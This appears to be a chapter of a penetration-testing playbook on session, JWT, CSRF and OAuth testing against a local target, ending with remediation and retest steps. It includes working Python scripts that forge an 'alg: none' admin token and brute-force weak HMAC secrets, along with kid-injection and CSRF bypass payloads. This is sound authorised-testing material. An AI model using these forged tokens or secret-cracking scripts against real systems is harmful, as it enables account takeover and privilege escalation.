# 03 — Session and Tokens

## 1. Scope and preconditions

The app issues a cookie, a JWT, or an OAuth session. The ROE allows token manipulation against the local target. Do not test tokens issued to real users.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/session"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

User A, user B, and admin sessions. Capture each `Set-Cookie` and token exactly once, redact them for the report, and keep the raw values only in `.redteam/evidence/`.

## 3. Enumeration

```bash
curl -sS -D "$OUT/login.headers" -o /dev/null -X POST "$TARGET/api/login" \
  -H 'Content-Type: application/json' -d '{"username":"user-a","password":"correct"}'
grep -i '^set-cookie' "$OUT/login.headers"
curl -sS -D "$OUT/me.headers" -b "$OUT/cookies_a.txt" "$TARGET/api/me"
```

If the token is a JWT, split it and decode the header and payload. Do not trust the UI's claims about roles; read the token.

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | Cookie flags | Inspect `Set-Cookie` for `HttpOnly`, `Secure`, `SameSite` | Missing flags on a session cookie |
| 2 | JWT decode | `cut -d. -f2 "$OUT/token.txt" \| base64 -d 2>/dev/null` | Role, tenant, or `sub` visible and trusted |
| 3 | `alg: none` | Craft a token with `{"alg":"none"}` and no signature; send it | Accepted as valid |
| 4 | Algorithm confusion | Change `RS256` to `HS256`, sign with the public key as HMAC secret | Accepted |
| 5 | Weak HMAC secret | Test a short dictionary of common secrets against the signature | Signature validates |
| 6 | `kid` injection | Set `kid` to `../../../../dev/null` or a SQLi payload; sign with an empty key | Accepted or path disclosed |
| 7 | Claim tampering | Change `role`, `tenant`, `sub`, or `exp`; re-sign if the secret is known | Privilege or identity change accepted |
| 8 | Expiry / audience | Replay an expired token; change `aud` or `iss` | Accepted when it should fail |
| 9 | CSRF | Send a state-changing request with `Origin: http://evil.local` and no CSRF token | Action succeeds |
| 10 | OAuth state / redirect | `curl -sS -i "$TARGET/oauth/authorize?client_id=app&redirect_uri=http://127.0.0.1:9999/cb&response_type=code&state="` | Missing state, open redirect, or code leak |
| 11 | Token in URL / logs | Search access logs and Referer for tokens; request a page with `?token=` | Token leaked to logs or third parties |
| 12 | Session fixation | Pre-set a cookie, log in, compare the cookie value | Cookie unchanged |

### Crafting an `alg: none` token

```bash
python3 - <<'PY'
import base64, json
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
h = b64({"alg": "none", "typ": "JWT"})
p = b64({"sub": "admin", "role": "admin", "exp": 9999999999})
print(f"{h}.{p}.")
PY
```

Send it as `Authorization: Bearer <token>`. A correct implementation rejects it with `401`.

### Testing a weak HMAC secret

```bash
python3 - <<'PY'
import base64, hashlib, hmac, json, sys
token = open(".redteam/evidence/session/token.txt").read().strip()
h, p, s = token.split(".")
msg = f"{h}.{p}".encode()
for secret in ["secret", "password", "changeme", "jwt", "dev", "test", "supersecret"]:
    sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), msg, hashlib.sha256).digest()).rstrip(b"=").decode()
    if hmac.compare_digest(sig, s):
        print("VALID SECRET:", secret)
        sys.exit(0)
print("no common secret")
PY
```

## 5. Bypass variants

- `alg` case variations (`None`, `NONE`), duplicate `alg` headers, and `typ` confusion.
- `kid` as a path, a URL, a SQL fragment, or a JSON injection point.
- Signature stripping, empty signature, and length-extension tricks.
- Claim types: string vs array for roles, `role` vs `roles`, nested `realm_access`.
- Cookie name confusion: `session` vs `session.sig`, duplicate cookies, path-scoped cookies.
- CSRF bypass: method override, JSON content type, `Origin: null`, missing token on one route.
- OAuth: `redirect_uri` path traversal, subdomain match, `response_mode=fragment`, PKCE downgrade.

## 6. Evidence to capture

- The original token header and payload, with secrets redacted.
- The crafted token and the response that accepted it.
- The exact cookie attributes.
- The state-changing request and its effect.
- The OAuth redirect chain.

## 7. False-positive traps

- A token may be accepted by a frontend but rejected by the API. Test the API directly.
- A 200 response to an expired token may be a cached page. Check the body and the authenticated data.
- CSRF may be blocked by `SameSite=Lax` for cross-site POSTs; test top-level navigation and same-site subdomains too.
- OAuth redirects to a localhost callback may be allowed by design in development. Check whether the code is exchanged and whether the state is validated.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| `alg: none` accepted | Critical | CWE-347, WSTG-SESS-01 |
| Weak JWT secret | High to Critical | CWE-521, WSTG-SESS-01 |
| Claim tampering to admin | Critical | CWE-269, WSTG-ATHZ-03 |
| CSRF on sensitive action | Medium to High | CWE-352, WSTG-SESS-05 |
| OAuth redirect / missing state | High | CWE-601, CWE-352 |
| Missing cookie flags | Low to Medium | CWE-614, WSTG-SESS-02 |
| Session fixation | High | CWE-384, WSTG-SESS-03 |
| Token in URL/logs | Medium | CWE-598, WSTG-SESS-04 |

## 9. Remediation patterns

- Pin the algorithm server-side; reject `none` and unexpected algorithms.
- Use a long random HMAC secret or asymmetric keys with a fixed key ID; never trust `kid` as a path.
- Validate `exp`, `nbf`, `aud`, `iss`, and `sub` on every request.
- Rotate session IDs on login; store server-side state with an idle and absolute timeout.
- Set `HttpOnly`, `Secure`, and `SameSite=Lax` or `Strict` on session cookies.
- Use a per-request CSRF token or a strict SameSite policy plus origin checks.
- Validate OAuth `state`, exact `redirect_uri`, and PKCE.

## 10. Retest procedure

Replay the crafted token and expect `401`. Replay the CSRF request and expect `403`. Replay the OAuth redirect with a foreign `redirect_uri` and expect rejection. Re-run the weak-secret test and confirm no common secret validates. Check that the cookie flags are present on a fresh login.

## Resources

- OWASP WSTG: WSTG-SESS, WSTG-ATHZ-03.
- OWASP Cheat Sheet: Session Management, CSRF Prevention, JWT.
- CWE-347, CWE-352, CWE-384, CWE-521, CWE-601, CWE-614.
- PortSwigger Academy: JWT, OAuth, CSRF labs.
